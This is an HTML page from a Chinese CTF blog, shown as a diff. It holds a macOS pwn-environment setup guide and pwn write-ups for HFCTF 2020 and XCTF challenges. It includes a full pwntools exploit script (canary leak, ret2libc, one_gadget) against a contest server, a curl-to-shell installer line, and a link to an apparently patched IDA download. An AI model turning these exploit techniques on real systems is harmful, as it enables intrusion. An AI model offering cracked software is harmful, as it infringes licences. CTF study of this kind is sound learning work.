@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>N0P3</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="在读大学生">
+<meta property="og:type" content="website">
+<meta property="og:title" content="N0P3">
+<meta property="og:url" content="https://cdn.n0p3.cn/page/2/index.html">
+<meta property="og:site_name" content="N0P3">
+<meta property="og:description" content="在读大学生">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="N0P3">
+<meta property="article:tag" content="CTF 网络安全 软件开发">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="N0P3" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">N0P3</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://cdn.n0p3.cn"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-MacOSPwn" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/22/MacOSPwn/" class="article-date">
+  <time datetime="2020-04-22T11:32:35.000Z" itemprop="datePublished">2020-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/22/MacOSPwn/">在MacOS 10.15 上配置基本的Pwn环境</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><em>Mac Pwn实在是不够香，还是虚拟机好用！</em></p>
+<p><em>Catalina给我造成了相当多的麻烦，于是便记录一下过程</em></p>
+<h1 id="安装Pwntools"><a href="#安装Pwntools" class="headerlink" title="安装Pwntools"></a>安装Pwntools</h1><p>首先，<strong>不要使用pip！</strong></p>
+<p>网上安装pwntools的教程中最多的就是pip安装，官网上的安装介绍也是pip安装。但是我们使用MacOS的homebrew来安装。</p>
+<p>如果你没有安装homebrew，执行下面的自动脚本</p>
+<p><code>/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</code></p>
+<p>直接在终端输入回车根据提示执行即可。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%884.15.59.png" alt="homebrew"></p>
+<p>homebrew就安装好了。</p>
+<p>执行<code>brew install pwntools</code> 安装pwntools</p>
+<p>再执行<code>brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-amd64.rb</code>  安装二进制工具binutils</p>
+<p>安装binutils时你可能会遇到443报错，这是由于众所周知的原因导致raw.githubusercontent.com的DNS解析被污染了。</p>
+<p>Step 1:  访问这个网站<a target="_blank" rel="noopener" href="https://www.ipaddress.com/%E5%8E%BB%E6%9F%A5%E8%AF%A2raw.githubusercontent.com">https://www.ipaddress.com/去查询raw.githubusercontent.com</a></p>
+<p>的真实ip地址。</p>
+<p>Step 2: 添加到&#x2F;etc&#x2F;hosts中</p>
+<p>完成之后应该就可以下载了。</p>
+<p>然后要把pwntools包加入到python环境里</p>
+<p>在&#x2F;Library&#x2F;Python&#x2F;2.7&#x2F;site-packages中新建一个.pth文件然后写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/Cellar/pwntools/4.0.1_1/libexec/lib/python3.8/site-packages </span><br></pre></td></tr></table></figure>
+
+<p><em>这一行需要自己看情况写，pwntools版本和python版本可能会不同</em></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%888.45.40.png" alt="path">然后就可以测试基本功能了。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%884.54.32.png" alt="checksec"></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/MacOSPwn/%E6%88%AA%E5%B1%8F2020-04-22%20%E4%B8%8B%E5%8D%888.53.28.png" alt="pwntools"></p>
+<p>测试都OK</p>
+<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>ida在Major版本上很好安装，但是网上现有的所有的安装包都无法在Catalina上安装。解决办法大致是 安装Major虚拟机，再安装旧版ida，打补丁拷贝目录到Catalina。实际操作起来有很多问题且很麻烦，于是我直接打包好了Catalina可用的dmg。</p>
+<p><a target="_blank" rel="noopener" href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/Ida%20for%20MacOS10.15.dmg">Ida for Catalina</a></p>
+<p>密码 <em><strong>n0p3.top</strong></em>，记得不要更新。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cdn.n0p3.cn/2020/04/22/MacOSPwn/" data-id="cleqs4p6s000dh4d754l3ch02" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MacOS/" rel="tag">MacOS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hfctf-2020" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/20/hfctf-2020/" class="article-date">
+  <time datetime="2020-04-20T03:48:59.000Z" itemprop="datePublished">2020-04-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/20/hfctf-2020/">hfctf-2020</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>参加了2020的虎符ctf，因为最近在学pwn，其他题目也就没有看，最后只解出一道pwn题。真的是太菜了，等着学习大师傅们的wp吧。</p>
+<h1 id="count"><a href="#count" class="headerlink" title="count"></a>count</h1><p><em>只有这道题是在出wp之前做出的。</em></p>
+<p>连接题目返回一个算式，要求通过200关。看起来不像pwn题，猜测可能是输入的地方存在漏洞。</p>
+<p>拖进ida，发现好像汇编有点奇怪，不是平时常见架构的程序。</p>
+<p>发现sub_400990是main函数</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.44.08.png" alt="main"></p>
+<p>阅读代码，随机生成4个在0～99的整数，要求用户输入line 38的计算结果，连续输入正确200次后就会调用一个read函数，共度入100个字节，然而v8只有78个字节，所以这里存在栈溢出漏洞。紧接着下面有一个if，判断v9是否等于304305682，如果等于讲调用函数sub_400920,看一下这个函数</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.43.33.png" alt="400920"></p>
+<p>直接就get shell。</p>
+<p>所以我们的攻击思路就是，先完成200关的计算任务，最后利用栈溢出覆盖v9的值，使if成立即可。</p>
+<p>exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.41.55.png" alt="exp"></p>
+<p>因为不会正则，只能手动分离4个数字了orz</p>
+<p>执行</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/hfctf/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8A%E5%8D%8811.32.41.png" alt="flag"></p>
+<p>[以下为赛后Pwn题复现]</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cdn.n0p3.cn/2020/04/20/hfctf-2020/" data-id="cleqs4p6y000sh4d73fek9bhy" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%82%E5%8A%A0%E7%9A%84%E6%AF%94%E8%B5%9B/" rel="tag">参加的比赛</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-XCTF-Pwn-Advance" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/18/XCTF-Pwn-Advance/" class="article-date">
+  <time datetime="2020-04-18T14:03:23.000Z" itemprop="datePublished">2020-04-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/18/XCTF-Pwn-Advance/">XCTF-Pwn-Advance</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="fogot"><a href="#fogot" class="headerlink" title="fogot"></a>fogot</h1><p>nc连接题目</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%8810.04.30.png" alt="nc"></p>
+<p>阅读文本，这个程序大概是一个检查邮箱格式是否合法的程序。</p>
+<p>拖进ida分析</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.54.22.png" alt="main"></p>
+<p>分两部分来看main函数，前半部分有数个函数指针，指向的是很多个只输出一条文本的函数。，接着用户的两次输入，可以看到有两处溢出，溢出点分别在33行和41行。继续看下半部分。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.55.24.png" alt="main2"></p>
+<p>有一段代码，解读一下就是在对我们第二次输入的邮箱地址进行逐个字符的分析，当找到‘@’时，就继续寻找‘.’，中间如果有没能找到的关键字符就执行不同的提示函数，前一段的数个函数指针指向的就是不同的提示函数。每完成一个要求v14就加1，最后调用不同的函数。</p>
+<p>看一下栈</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.58.28.png" alt="栈"></p>
+<p>我们输入的邮箱地址程序里又正好给了可以getflag的函数，所以我们的攻击思路就是，利用溢出漏洞覆盖某个函数指针指向的函数为目标函数，然后满足代码条件使它执行。</p>
+<p>我选了v12函数指针，exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%888.08.53.png" alt="exp"></p>
+<p>‘<a href="mailto:&#x61;&#64;&#x61;&#x2e;&#x63;&#x6f;&#x6d;&#x6d;">&#x61;&#64;&#x61;&#x2e;&#x63;&#x6f;&#x6d;&#x6d;</a>’最后会调用v12，后面的部分覆盖v12指向的函数。</p>
+<h1 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h1><p>连接题目看一下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.18.png" alt="nc"></p>
+<p>可以选择攻击方式，栈溢出或者格式化字符串，但是这道题真的是想考察这两个知识而已吗？</p>
+<p>拖进ida分析</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.26.08.png" alt="main"></p>
+<p>可以看出程序有canary保护</p>
+<p>main函数就是让用户选择，然后调用不同的函数的，主要看sub_4008EB和sub_400960</p>
+<p>sub_4008EB</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.00.png" alt="4008eb"></p>
+<p>如题目所说，确实存在一个格式化字符串漏洞，再去看sub_400960</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.12.png" alt="400960"></p>
+<p>同样也真的存在一个栈溢出漏洞，那我们的攻击思路就有了：</p>
+<p>先利用格式化字符串漏洞得到canary的值，再利用栈溢出漏洞构造rop链调用flag函数。canary的位置，首先计算步长，也就是printf取参数指针到buf的距离，测试得出是6，再加上buf到v2的距离0x90-0x8&#x3D;0x88(十进制17)，所以17+6&#x3D;23</p>
+<p>exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.04.png" alt="exp"></p>
+<p>花了我最长时间的地方居然是处理接收到的canary值，很多写法都莫名报错，最后这样写是可以的。</p>
+<h1 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h1><p><em>*这题用到pwntools的一个功能DynELF</em></p>
+<p>nc连接只有一次输出一次输入，拖进ida分析</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.30.png" alt="main"></p>
+<p>定义了很多变量，但是也没用到，调用了sub_8048484</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.50.png" alt="8048484"></p>
+<p>很明显在line 6存在栈溢出漏洞，但是没有system函数，也没有shellcode，所以要用到DynELF。<em>（libcSearch也是查找libc用的，但是我并没有用过）</em></p>
+<p>exp如下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.17.47.png" alt="exp"></p>
+<p>在使用DynELF的功能前需要先设定一个dyn对象，在line 12，第一个参数指定leak地址用的函数，第二个参数是目标程序。</p>
+<p><em>DynELF的lookup函数就是利用我们写的leak函数来循环爆破寻找system的地址，leak函数有一定的格式。</em></p>
+<p>shellcode可以通过一段可用的bss段储存</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%889.34.53.png" alt="bss"></p>
+<p>exp逻辑不复杂，但是要注意堆栈的恢复和一些细节。</p>
+<h1 id="Pwn-100"><a href="#Pwn-100" class="headerlink" title="Pwn-100"></a>Pwn-100</h1><p><em>*这道题花了很长时间，主要花时间在想用DynELF做，到最后也没有写出来，还是用LibcSearcher解了。</em></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.18.58.png" alt="nc"></p>
+<p>链接看一下，直接有输入，一直输一直输，要很长才会输出一个bye～，ida看一下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.26.png" alt="ida"></p>
+<p>主函数没东西，跟踪到40068E看一下</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.39.png" alt="68e"></p>
+<p>声明了一个v1，调用40063D，注意传参传了一个200，继续看</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.49.png" alt="63d"></p>
+<p>一个执行200次的循环，循环体是一个只读入1个字节的read，显然这里存在溢出。</p>
+<p>exp：</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.33.55.png" alt="exp"></p>
+<p>第16行为什么这样写，需要自己去调试出来。</p>
+<p><em>LibcSearcher和Ropgadget真好用。</em></p>
+<h1 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h1><p>有故事背景，还有多层的代码，感觉是个好玩的题，结果一看发现就是简单的栈溢出</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/%E5%8F%8D%E5%BA%94%E9%87%9C%E6%8E%A7%E5%88%B6%E5%BC%80%E5%85%B3/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%888.36.03.png" alt="exp"></p>
+<p>非常简单，看了官方wp发现这原来是一道盲打。emmm，果然是道好题。</p>
+<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><em>*因为期末导致一段时间没有做pwn了，拿这道题找找感觉</em></p>
+<p>题目描述没有过多信息，看题。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175926.png" alt="sec"></p>
+<p>64位。</p>
+<p>三个选项，1.储存，2.打印，3.退出</p>
+<p>看main函数</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175517.png" alt="main"></p>
+<p>s的大小是0x80个字节，read却可以读取0x100个字节，存在很明显的溢出。但是有canary保护所以我们首先要泄漏canary。之前利用过格式化字符串泄漏canary，这次要利用puts函数的特性来泄漏。</p>
+<p>puts函数只有遇到空字节才会停止输出，即使是0a（换行）也不会停止。canary的第一个字节是空字节，所以puts不会把canary输出，我们只要溢出覆盖掉canary的第一个字节就可以把canary泄漏出来了。</p>
+<p>s距离canary 0x88个字节，要覆盖掉canary的首位就构造一个0x89个字符的payload。</p>
+<p><code>payload=0x85*&#39;a&#39;+&#39;N0P3&#39;</code></p>
+<p>获得canary之后就可以进一步泄漏库函数地址计算offset了。</p>
+<p><code>payload=0x84*&#39;a&#39;+&#39;N0P3&#39;+p64(canary)+&#39;b&#39;*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</code></p>
+<p>小片段是通过ROPgadget找到的。</p>
+<p>获得offset之后就可以按照一般的ret2libc方法get shell了。但是这里对payload的长度有限制（0x100），所以用one_gadget来解。</p>
+<p>最后的payload</p>
+<p><code>payload=0x84*&#39;a&#39;+&#39;N0P3&#39;+p64(canary)+&#39;b&#39;*0x8+p64(GetShell)</code></p>
+<p>Exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">res=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">36024</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">res.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">payload=<span class="number">0x85</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;N0P3&#x27;</span></span><br><span class="line">res.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line"><span class="comment">#res.recv()不知道为什么不需要接收</span></span><br><span class="line">res.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">res.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">canary_raw=res.recvuntil(<span class="string">&#x27;\n---&#x27;</span>)</span><br><span class="line">canary=u64(<span class="string">&#x27;\x00&#x27;</span>+canary_raw[<span class="number">137</span>:<span class="number">137</span>+<span class="number">7</span>])<span class="comment">#得到canary(canary的高位被我们覆盖了，补一个）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Get Canary!&#x27;</span>)</span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line"><span class="comment">#ROPgadget --binary babystack --only &quot;pop|ret&quot;|grep &quot;rdi&quot;</span></span><br><span class="line">start_addr=<span class="number">0x400720</span></span><br><span class="line">pop_rdi=<span class="number">0x400a93</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=<span class="number">0x400690</span></span><br><span class="line">payload=<span class="number">0x84</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;N0P3&#x27;</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">res.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line">res.recv()<span class="comment">#需要接收一次空</span></span><br><span class="line">res.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">res.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">puts_got=u64(res.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Get Puts_Got!&#x27;</span>)</span><br><span class="line"><span class="comment">#--------------------------------------------------------</span></span><br><span class="line"><span class="comment">#One_gadget </span></span><br><span class="line">shell= <span class="number">0x45216</span></span><br><span class="line">puts_libc=libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">offset=puts_got-puts_libc</span><br><span class="line">GetShell=offset+shell</span><br><span class="line">payload=<span class="number">0x84</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;N0P3&#x27;</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(GetShell)</span><br><span class="line">res.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">res.send(payload)</span><br><span class="line"><span class="comment">#res.recv()不知道为什么不需要接收</span></span><br><span class="line">res.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">res.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><em>在ida的伪代码的36行有一个sub_400826函数，是puts的再封装，无额外代码。但是这个函数却存在“失效”的现象。理论上在exp每次发送完payload后都应该接收一次空，再接收主界面字符串。但是经过测试只有第二次payload发送后才需要。具体原因未知，麻烦大佬路过解释指点一下。</em></p>
+<h1 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h1><p><em>*终于遇到了必须动调的题目了</em></p>
+<p>看一下程序的情况</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8810.28.31.png"></p>
+<p>32位的，并且有canary保护，估计又要绕过canary了。</p>
+<p>程序是一个平均数计算器。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/stack2Ida.jpg" alt="ida"></p>
+<p>3号更换数字功能没有对用户输入的位置进行检查，存在数组越界漏洞。这个漏洞意味着我们可以对从数组的首地址开始到<strong>低地址</strong>方向上的所有数据进行更改。</p>
+<p>那么我们就可以直接绕过canary以“合法”的方式修改返回地址，构造rop。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.07.02.png"></p>
+<p>在函数列表里有一个函数hackhere，直接开了bash。那么我们似乎只要调用这个函数就可以了。接下来就是最重要的找偏移，从数组首地址到返回地址的距离是多少。起初我是以ida静态分析的栈来算的，得到的是0x74。怎么都不对，后来看了其他师傅的wp发现原来程序实际运行时的偏移不一样。</p>
+<p>所以我们要动态调试一下。</p>
+<p>我在line 30下了断点，因为此处会向数组存储数据，第一次存储数据时的eax的值就是数组的首栈地址。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.44.23.png"></p>
+<p>程序到达断点，输入一个9</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.45.27.png"></p>
+<p>看到高亮行正要向eax指向的栈地址放入数据，数据正是我们刚刚输入的9。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.09.32.png"></p>
+<p>记录一下此时的eax ,0xFFEF2258。找到数组首地址后我们就要找函数的返回地址了。当程序执行ret的时候，esp一定是指向返回地址的。所以我们在主函数的return 0处下断点，选择5，退出程序。</p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.10.25.png"></p>
+<p><img src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.10.41.png"></p>
+<p>此时esp指向0xFFEF22DC，大地址减去小地址就得到了正确偏移0x84。（这两个地址的寻找一定要在一次调试中找出来，因为栈地址是随机的）</p>
+<p>算出了偏移我们就可以进行攻击了，但是直接调用hackhere函数并不可以，因为目标主机上并没有bash，所以我们要利用&#x2F;bin&#x2F;bash的后两文起一个sh，构造简单的rop。</p>
+<p>exp:</p>
